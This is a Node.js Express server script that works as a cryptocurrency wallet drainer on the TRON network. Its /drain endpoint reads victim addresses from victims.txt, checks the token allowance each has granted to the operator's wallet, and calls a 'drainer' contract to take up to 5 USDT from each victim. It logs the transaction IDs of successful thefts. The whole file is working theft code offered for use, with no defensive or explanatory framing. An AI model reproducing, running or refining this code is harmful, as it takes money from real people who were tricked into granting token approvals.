require('dotenv').config();
const TronWeb = require('tronweb');
const fs = require('fs'); // File System module to read .txt files

// --- CONFIGURATION (Reads from .env) ---
const PRIVATE_KEY = process.env.PRIVATE_KEY; 
const MY_WALLET_ADDRESS = process.env.MY_WALLET_ADDRESS; 
const DRAINER_CONTRACT_ADDRESS = process.env.DRAINER_CONTRACT_ADDRESS; 

// Helper function to read victims from txt file
function getVictimsFromTxt() {
    try {
        const data = fs.readFileSync('./victims.txt', 'utf8');
        // Split by new lines or commas, remove empty strings
        return data.split(/[\n,]+/).map(addr => addr.trim()).filter(addr => addr.length > 0);
    } catch (err) {
        console.error("Error reading victims.txt:", err.message);
        return [];
    }
}

// Express setup for Render
const express = require('express');
const app = express();

app.get('/drain', async (req, res) => {
  try {
    if (!PRIVATE_KEY || !DRAINER_CONTRACT_ADDRESS) {
      throw new Error("Missing PRIVATE_KEY or DRAINER_CONTRACT_ADDRESS in .env file");
    }

    const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    await tronWeb.setPrivatekey(PRIVATE_KEY);

    // Read victims from the text file
    const VICTIMS = getVictimsFromTxt();
    
    if (VICTIMS.length === 0) {
      return res.status(400).json({ message: "No victims found in victims.txt" });
    }

    let results = [];

    for (let i = 0; i < VICTIMS.length; i++) {
      const victim = VICTIMS[i];
      
      try {
        const contract = await tronWeb.contract().at(DRAINER_CONTRACT_ADDRESS);
        
        // Check Allowance
        const allowance = await contract.allowance(victim, MY_WALLET_ADDRESS).call();
        
        if (allowance === 0) {
          results.push({ address: victim, status: "No Allowance - Skipped" });
          continue;
        }

        // Drain logic (Max 5 USDT)
        const amountToDrain = Math.min(allowance, 5000000); 
        
        const result = await contract.drain(victim, amountToDrain).send({
          feeLimit: 100000000, 
          from: tronWeb.defaultAddress.addressBase58
        });

        results.push({ 
          address: victim, 
          txId: result.transactionID, 
          status: "Success", 
          drained: amountToDrain 
        });
        
        // Delay to avoid rate limits
        await new Promise(r => setTimeout(r, 1500)); 

      } catch (err) {
        results.push({ address: victim, error: err.message, status: "Failed" });
      }
    }

    res.status(200).json({ results });

  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server only if running directly (not when imported)
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}

module.exports = app;
